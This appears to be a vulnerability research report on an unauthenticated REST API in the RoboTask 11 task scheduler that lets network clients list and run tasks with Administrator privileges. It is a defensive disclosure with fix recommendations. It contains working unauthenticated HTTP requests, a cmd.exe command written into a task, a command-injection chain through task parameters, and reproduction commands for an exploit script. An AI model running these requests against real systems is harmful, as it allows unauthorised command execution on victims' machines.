# RoboTask — REST API Unauthenticated Remote Task Execution (CWE-306)

## 1. Product & Attack Surface

RoboTask 11 (Neowise Software, Windows task automation / job scheduler, Delphi 11.x Alexandria) ships a built-in REST API server (dmvcframework + Indy TIdHTTPServer + sgcWebSockets) with default port 9999. The REST server is disabled by default (`RestIsEnabled=0`), but when enabled it binds to `0.0.0.0` by default.

## 2. Authentication Boundary

Authentication is controlled by the registry switch `RestUseApiKeys` (`HKCU\SOFTWARE\TaskAutomation\RoboTask\Settings`):

- `RestUseApiKeys=0` (**default**) → no `X-API-KEY` validation; all 12 REST endpoints reachable without credentials
- `RestUseApiKeys=1` → validates `X-API-KEY` (`securityDefinitions.ApiKeyAuth`)
- `RestBypassAuthForLocalhost=1` → localhost always bypasses auth

Measured values:

```
RestIsEnabled              REG_DWORD    0x1   (research env enabled; default 0x0)
RestUseApiKeys             REG_DWORD    0x0   (default: no auth ← root cause)
RestBypassAuthForLocalhost REG_DWORD    0x1
RestApiKeys                (empty)
RestUseTLS                 REG_DWORD    0x0
RestServerIp               REG_SZ       "0.0.0.0"
RestServerPort             REG_DWORD    0x270f (9999)
```

## 3. Sink: Task Execution Engine

Tasks are stored as `.tsk` files (INI format, `C:\Users\<user>\AppData\Local\RoboTask\Tasks\`). Tasks consist of Actions; sink action types:

- `A_GENERAL_RUN_PROG` → CreateProcess (program/params/runas/wait)
- `A_SCRIPT_VBSCRIPT` → VBScript engine
- `A_SCRIPT_PYTHON` → Python engine
- `A_SCRIPT_JS` → JS engine
- `A_FILE_*` / `A_REGISTRY_*` → file/registry operations

When triggered, tasks execute with the RoboTask process privileges (typically Administrator).

## 4. Source: REST API Endpoints

12 REST endpoints + 1 swagger. Key sources:

- **POST /api/tasks/{id}/run** (body `{"params":{}}`) → task execution entry
- **GET /api/tasks** → enumerate task IDs (attacker selects target task)

All 12 endpoints are unauthenticated when `RestUseApiKeys=0` (dynamically verified: HTTP 200 without `X-API-KEY`).

> Note: The REST API has no task creation/editing endpoint (`EditTask`/`SaveTask` are internal functions, not exposed via REST). An attacker can only trigger pre-existing tasks, not create new ones remotely.

## 5. Data Flow

```
Unauthenticated network attacker (firewall permits 9999)
   │ POST /api/tasks/{id}/run  (no X-API-KEY)
   ▼
RoboTask REST API (0.0.0.0:9999, RestUseApiKeys=0)
   │ no auth check (non-localhost also bypasses) → reaches task engine
   ▼
Task engine loads .tsk (any task from /api/tasks enumeration)
   │ task contains A_GENERAL_RUN_PROG / A_SCRIPT_* action
   ▼
CreateProcess / script engine executes (predefined program/script) ← Administrator privileges
   ▼
System operations: run program / run script / write file / modify registry
```

## 6. Exploitation Details

Chain = unauthenticated task enumeration + unauthenticated trigger of a task containing a sink action:

1. `GET /api/tasks` (no auth) → `{"data":[{id,name,...}]}`, pick a task with a Run Program / script action.
2. `POST /api/tasks/{id}/run` body `{"params":{}}` (no auth) → triggers the task; the predefined command runs as Administrator.

**F10 params command-injection chain (not triggerable by default)**: `/run` accepts a `params` object. If a task uses `{dataN}` concatenated into a command line (`A_GENERAL_RUN_PROG` with `params=STRING|"...{data1}..."`), an attacker can inject commands. However, §12 verification showed none of the default 44 `.tsk` files use `{dataN}` in commands, and the REST API has no task-creation endpoint → not triggerable on a default deployment. User-created tasks using this pattern would be injectable.

## 7. Dynamic Verification

### 7.1 Execution Environment

- Target: Windows Server 2025, RoboTask 11.0.5.1229 running as Administrator
- REST: `0.0.0.0:9999`, `RestUseApiKeys=0`, `RestBypassAuthForLocalhost=1`
- Local network NIC reachable from the test host

### 7.2 Remote Reachability (transparent disclosure)

| Test path | Result | Note |
|-----------|--------|------|
| Server itself → NIC IP:9999 | HTTP 200 | App accepts non-localhost connections (NIC IP != 127.0.0.1) |
| Server itself → public IP (hairpin NAT) | timeout | Cloud hairpin NAT unsupported |
| External host → public IP:9999 | timeout | Cloud security group blocked 9999 |

The application-layer vulnerability is proven (accepts non-localhost unauthenticated connections). Cross-machine remote access was blocked by the cloud security group — an infrastructure limitation, not an application control. In a real local deployment (no cloud security group), any client on the same LAN can access it unauthenticated.

### 7.3 Evidence A: Unauthenticated Trigger of a Predefined Task (no task modified)

Triggered the built-in demo task `[DEMO] Retrieve task parameters to CSV` (ID `d6708ff0`, unmodified). Action 9 writes `{TaskFolder}\map.csv`; Action 10 runs `notepad.exe`.

Request (no X-API-KEY):

```
POST http://<LAN_IP>:9999/api/tasks/d6708ff0/run HTTP/1.1
Content-Type: application/json

{"params":{}}
```

Response (HTTP 200):

```json
{"status":"success","code":0,"msg":"",
 "data":{"id":"d6708ff0","name":"[DEMO] Retrieve task parameters to CSV",
         "externalName":"Task297","folderId":"0000000a","active":false,"state":"manual",
         "metadata":{"runCount":1,
                     "lastReason":"REST API Server (client ip: <LAN_IP>)",
                     "lastStart":"2026-08-02T22:02:35.347Z",...}}}
```

`lastReason: REST API Server (client ip: <LAN_IP>)` proves the task was triggered by a non-localhost REST request.

Target-side verification (task side-effect file):

```
[+] map.csv EXISTS: C:\Users\<user>\AppData\Local\RoboTask\Tasks\map.csv
[+] Size: 2102 bytes, Created: 08/02/2026 22:02:35
```

→ unauthenticated remote task execution confirmed (no task file modified, predefined task triggered, Administrator-privilege file write + notepad.exe).

### 7.4 Evidence B (local post-exploitation amplification — transparent disclosure)

> Requires local `.tsk` write permission; a remote attacker cannot do this via REST (no task-edit endpoint). It only proves that a task containing a Run Program action is equivalent to command execution when triggered.

After locally changing task `d6708ff0` Action 10 to `cmd.exe /c echo ROBOTASK_UNAUTH_RCE_PROOF > <path>\rt_pwned.txt`, an unauthenticated POST /run trigger produced:

```
[+] <path>\rt_pwned.txt EXISTS
[+] Content: ROBOTASK_UNAUTH_RCE_PROOF
```

This proves that a task containing an `A_GENERAL_RUN_PROG` action executes arbitrary predefined commands with RoboTask privileges when triggered. A remote attacker can trigger any "Run Program" task the victim has configured (users commonly configure tasks that run system commands/scripts in real deployments).

## 8. Reachability

- Application layer: `0.0.0.0` binding + `RestUseApiKeys=0` means non-localhost unauthenticated connections are accepted (NIC IP empirically returned HTTP 200).
- Infrastructure layer: cross-machine remote access blocked by the cloud security group (not an application control).
- Real deployment: any client on the same LAN (firewall permitting 9999) can access it unauthenticated.

## 9. Impact & Fix Recommendations

**Impact**: Unauthenticated execution of pre-existing tasks with RoboTask process privileges (typically Administrator): run programs, scripts, modify files/registry. Requires the operator to have enabled the REST server and a pre-existing task with a run-program/script action.

**Fix recommendations**:
1. Change `RestUseApiKeys` default to `1` (enforce API keys)
2. Change `RestServerIp` default to `127.0.0.1`; require explicit configuration to expose non-localhost
3. Warn administrators when enabling REST with non-localhost binding and no auth
4. Enable TLS by default (`RestUseTLS=1`)

## 10. Adversarial Verification Conclusion

- **Falsification agent**: confirmed missing authentication; noted "remote" was not proven cross-machine; "RCE" is really triggering predefined tasks; F10 chain not empirically proven. Recommended CWE-306, CVSS 7.5-8.0.
- **Independent re-analysis agent**: confirmed Delphi but corrected version (rtl280 = 11.x Alexandria); confirmed REST has no task-edit endpoint; confirmed none of the 44 default .tsk files use `{dataN}` concatenation; recommended retitling to "unauthenticated remote task execution".

## 11. Reproduction

```bash
# From a host on the same network as the target (firewall permitting 9999)
python3 robotask_unauth_task_rce.py <TARGET_IP> 9999 --list          # unauthenticated task enumeration
python3 robotask_unauth_task_rce.py <TARGET_IP> 9999 --task <TASK_ID> # unauthenticated task trigger
```

## 12. Timeline & Disclosure Status

- Research completed and dynamically verified: 2026-08
- Vendor notification, CVE, and public disclosure channels: pending operator approval (Batch #6)
